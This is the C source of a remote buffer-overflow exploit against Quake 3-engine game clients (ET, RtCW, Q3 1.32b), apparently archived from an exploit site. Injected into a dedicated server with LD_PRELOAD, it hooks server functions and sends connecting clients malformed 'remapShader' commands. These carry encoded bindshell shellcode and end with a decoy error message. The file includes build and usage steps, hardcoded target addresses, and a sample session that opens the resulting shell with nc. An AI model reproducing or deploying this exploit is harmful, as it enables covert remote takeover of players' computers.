// remap_this.c - "R_RemapShader()" q3 engine 1.32b client remote bof exploit
// by landser - landser at hotmail.co.il
//
// this code works as a preloaded shared library on a game server,
// it hooks two functions on the running server:
// svc_directconnect() that is called when a client connects,
// and sv_sendservercommand() which we use to send malformed "remapShader" commands to clients.
// vuln clients connecting to the server will bind a shell on a chosen port (#define PORT) and exit cleanly with an unsuspicious error message.
//
// vuln: latest linux clients of ET, rtcw, and q3 on boxes with +x stack (independent of distro)
// (win32 clients are vuln too but not included here)
//
// usage:
// gcc remap_this.c -shared -fPIC -o remap_this.so
// and run a server with env LD_PRELOAD="./remap_this.so"
//
// -----------------------------------------------------
// [luser@box ~/wolfenstein]$ LD_PRELOAD="./remap_this.so" ./wolfded.x86 +set net_port 5678 +map mp_beach
// remap_this.c by landser - landser at hotmail.co.il
//
// game: RtCW 1.41 Dedicated.
// [...]
// directconnect(): 10.0.0.4 connected
// sendservercommand() called
// sendservercommand() called
// sendservercommand() called
// [...]
// [luser@box ~/wolfenstein]$ nc 10.0.0.4 27670 -vv
// sus4 [10.0.0.4] 27670 (?) open
// id
// uid=1000(luser) gid=100(lusers)
// -----------------------------------------------------
//
// visit www.nixcoders.org for open source linux cheats

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <dlfcn.h>
#include <sys/mman.h>

#define SILENT // hide the crappy server output
#define PORT 27670 // bindshell port. some values are invalid

struct netaddr { // from q3-1.32b/qcommon/qcommon.h
	int type;
	unsigned char ip[4];
	unsigned char ipx[10];
	unsigned short port;
};

struct {
	char *name;
	char *fn;
	unsigned long retaddr;	// something that jumps to %esp
	unsigned long sendservercommand; // address of sv_sendservercommand()
	unsigned long directconnect; // address of svc_directconnect()
	int hooklen; // for both sendservercommand and directconnect
	unsigned long errormsg; // address of error string
	unsigned long comerror; // address of com_error()
	int popas; // num of popa instructions before shellcode
	int gap; // gap between %esp to %eip when prog gets to the last shellcode instruction
} games[] = {
	{"ET 2.60 Dedicated",		"etded",
		0x081b4133, 0x08056c10, 0x0804e880, 6, 0x081a6a65, 0x0806a1a0, 14, 12},
	{"RtCW 1.41 Dedicated",		"wolfded",
		0x080c4356, 0x0805ee94, 0x08058740, 9, 0x08187772, 0x080a87e8, 14, 12},
	{"Quake 3 1.32b Dedicated",	"q3ded",
		0x080a200b, 0x0805fa68, 0x08059884, 9, 0x08167635, 0x08094688, 11, 27},
};

const int ngames = sizeof(games) / sizeof(games[0]);
const unsigned short int port = PORT;

static void *hook (void *, int, void *);
static void sendservercommand (void *, const char *, ...);
static void directconnect (struct netaddr);
static void writebuf (void);

void (*_sendservercommand)(void *, const char *, ...);
void (*_directconnect)(struct netaddr);

int c = -1;
unsigned char buf[1024];

// shellcode (286 bytes):
// fork()s,
// the parent proc calls com_error() with an error message (errormsg var),
// the child proc binds a shell on a chosen port
// unallowed chars: 0x00, 0x22, 0x2e, 0x5c, >=0x80
unsigned char sc[] =
	"\x68\x03\x5a\x70\x50\x58\x05\x01\x01\x7b\x71\x50\x68\x57\x50\x7f\x69"
	"\x58\x05\x01\x7d\x01\x01\x50\x68\x70\x30\x6a\x06\x58\x66\x05\x7b\x76"
	"\x50\x68\x54\x5b\x52\x53\x68\x2f\x62\x69\x6e\x68\x2f\x73\x68\x68\x68"
	"\x0b\x58\x68\x2f\x68\x48\x78\x79\x69\x58\x05\x01\x01\x7f\x01\x50\x68"
	"\x3e\x57\x50\x01\x58\x05\x01\x01\x7d\x7f\x50\x68\x75\x1c\x59\x6a\x68"
	"\x50\x01\x48\x40\x58\x66\x05\x7d\x7f\x50\x68\x5b\x6a\x02\x58\x68\x7f"
	"\x50\x53\x58\x58\x66\x40\x50\x68\x69\x65\x57\x50\x58\x05\x01\x01\x01"
	"\x7d\x50\x68\x57\x54\x59\x43\x68\x7f\x5f\x50\x50\x58\x66\x40\x50\x68"
	"\x69\x65\x57\x50\x58\x05\x01\x01\x01\x7d\x50\x68\x7f\x6a\x04\x5b\x58"
	"\x66\x40\x50\x68\x69\x65\x57\x50\x58\x05\x01\x01\x01\x7d\x50\x68\x51"
	"\x50\x54\x59\x68\x45\x55\x6a\x10\x68\x5b\x0e\x50\x44\x58\x05\x02\x01"
	"\x7d\x01\x50" "PORT" "\x66\x68\x5b\x5d\x52\x66\x68\x53\x58\x50\x01"
	"\x58\x05\x01\x01\x7d\x7f\x50\x68\x52\x53\x6a\x02\x68\x4a\x6a\x01\x5b"
	"\x68\x58\x6a\x01\x5a\x68\x07\x50\x6a\x66\x58\x66\x05\x01\x73\x50\x68"
	"\x67" "CM1" "\x58\x05\x01" "CM2" "\x50\x68\x6a\x02\x6a\x01\x68" "ERRM"
	"\x68\x40\x74\x0f\x68\x68\x57\x50\x7f\x47\x58\x05\x01\x7d\x01\x01\x50"
	"\x68\x41\x41\x6a\x02\x74\x0c\x75\x0a";

void __attribute__ ((constructor)) init (void) {
	char buf[256];
	int ret;
	
	printf("remap_this.c by landser - landser at hotmail.co.il\n\n");

	ret = readlink("/proc/self/exe", buf, sizeof buf);
	if (ret < 0) {
		perror("readlink()");
		exit(EXIT_FAILURE);
	}
	buf[ret] = '\0';

	for (c=0;c<ngames;c++)
		if (strstr(buf, games[c].fn)) break;
	
	if (c == ngames) {
		printf("binary doesnt match any of the targets.\n");
		exit(EXIT_FAILURE);
	}
	
	printf("game: %s.\n\n", games[c].name);

	writebuf();

	_sendservercommand = hook((void *)games[c].sendservercommand, games[c].hooklen, &sendservercommand);
	_directconnect = hook((void *)games[c].directconnect, games[c].hooklen, &directconnect);
}

int fputs (const char *s, FILE *fp) {
	static int (*_fputs)(const char *, void *);
	if (!_fputs) _fputs = dlsym(RTLD_NEXT, "fputs");

#ifdef SILENT
	if (strncmp(s, "---", 3)) return 1;
#endif

	return _fputs(s, fp);
}

static void sendservercommand (void *client, const char *fmt, ...) {
	printf("sendservercommand() called\n");
	_sendservercommand(client, "%s", buf);
}

static void directconnect (struct netaddr addr) {
	printf("directconnect(): %d.%d.%d.%d connected\n",
		addr.ip[0], addr.ip[1], addr.ip[2], addr.ip[3]);
	_directconnect(addr);
}

static void writebuf (void) {
	unsigned char *cm1, *cm2, *ptr = buf;
	int i, b;

	strcpy(ptr, "remapShader ");
	if (strstr(games[c].name, "Quake")) strcat(ptr, "j w ");
	strcat(ptr, "\"");
	ptr += strlen(ptr);

	memset(ptr, '\b', 76);
	ptr += 76;

	memcpy(ptr, &games[c].retaddr, 4);
	ptr += 4;

	if (strstr(games[c].name, "Quake")) {
		// replaces %ebp with %esp without using the stack
		memcpy(ptr, "\x33\x2f\x31\x2f\x31\x27\x33\x27\x31\x27", 10);
		ptr += 10;
	}

	memset(ptr, 0x61, games[c].popas); // 'popa' instructions
	ptr += games[c].popas;

	memcpy(ptr, sc, sizeof(sc));
	
	memset(ptr + strlen(ptr) - 3, games[c].gap, 1);
	memset(ptr + strlen(ptr) - 1, games[c].gap - 2, 1);

	cm1 = strstr(ptr, "CM1");
	cm2 = strstr(ptr, "CM2");
	if (!cm1 || !cm2) abort();
	
	for (i=0;i<3;i++) {
		b = (games[c].comerror >> (8*i)) & 0xff;
		
		if ((b-1) >= 0x7f) {
			cm1[i] = 0x6b;
			cm2[i] = b - 0x6b;
		}
		else {
			cm1[i] = b - 1;
			cm2[i] = 1;
		}
	}

	ptr = strstr(ptr, "PORT");
	if (!ptr) abort();
	memcpy(ptr, "\x68\x68", 2); // 68 - pushl imm32
	memcpy(ptr+2, &port, sizeof port);
	
	ptr = strstr(ptr, "ERRM");
	if (!ptr) abort();
	memcpy(ptr, &games[c].errormsg, 4);

	strcat(ptr, "\"");
	if (!strstr(games[c].name, "Quake")) strcat(ptr, " j w");
}

#define PAGE(x) (void *)((unsigned long)x & 0xfffff000)

static void *hook (void *hfunc, int len, void *wfunc) {
        void *newmem = malloc(len+5);
	long rel32;

	// copy 'len' bytes of instruction from 'hfunc' to 'newmem' and a 'jmp *hfunc' instruction after it
        memcpy(newmem, hfunc, len);
	memset(newmem+len, 0xe9, 1); // e9 - jmp rel32
	rel32 = hfunc - (newmem+5);
	memcpy(newmem+len+1, &rel32, sizeof rel32);

	// make 'hfunc's address writable & executable
	mprotect(PAGE(hfunc), 4096, PROT_READ|PROT_WRITE|PROT_EXEC);
        
	// change the start of 'hfunc' to a 'jmp *wfunc' instruction
	memset(hfunc, 0xe9, 1); // e9 - jmp rel32
        rel32 = wfunc - (hfunc+5);
	memcpy(hfunc+1, &rel32, sizeof rel32);

        return newmem;
}

// milw0rm.com [2006-05-05]
